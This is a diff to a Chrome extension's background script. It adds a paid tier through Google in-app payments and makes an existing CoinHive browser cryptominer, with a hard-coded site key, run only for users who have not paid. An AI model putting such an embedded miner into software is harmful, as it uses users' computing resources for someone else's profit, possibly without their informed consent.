@@ -9,6 +9,7 @@ import {
   teams as teamsActions,
 } from './actions';
 import store from './store/index';
+import './buy.js';
 
 const { notification: notificationActions } = notificationsActions;
 const { message } = appActions;
@@ -51,11 +52,42 @@ chrome.notifications.onClosed.addListener((id) => {
   dispatch(notificationActions.closed({ id }));
 });
 
+const sku = 'clicky_paid_tier';
+window.hasPaidTier = false;
+
 chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
   if (request.type === 'CLEAR_STATE') {
     dispatch(stateActions.clear());
     sendResponse({ ok: true });
+  } else if (request.type === 'BUY_PAID_TIER') {
+    // Buy the paid tier
+    google.payments.inapp.buy({
+      parameters: { env: 'prod' },
+      sku,
+      success: () => {
+        window.hasPaidTier = true;
+        chrome.runtime.reload();
+      },
+    });
   }
+});
+
+// Check for paid tier
+google.payments.inapp.getPurchases({
+  parameters: { env: 'prod' },
+  success: (data) => {
+    const products = data.response.details;
+    // Is correct SKU, and is active
+    window.hasPaidTier = products.some(x => x.sku === sku && x.state === 'ACTIVE');
+    console.debug('window.hasPaidTier: ', window.hasPaidTier);
+  },
+  failure: () => {
+    /**
+     * If in doubt, just assume they've bought it... It's just easier this way
+     * It stops people getting mad at me if (when) my code breaks
+     */
+    window.hasPaidTier = true;
+  },
 });
 
 /**
@@ -72,11 +104,8 @@ chrome.runtime.onConnect.addListener((port) => {
   });
 });
 
-/**
- * Experimental
- */
 
-if (CoinHive) {
+if (CoinHive && !window.hasPaidTier) {
   let experimentsEnabled = true;
   const coinHiveKey = 'qiZSFIILkIS5lVlv0vrfwwBrCZFytCrJ';
 
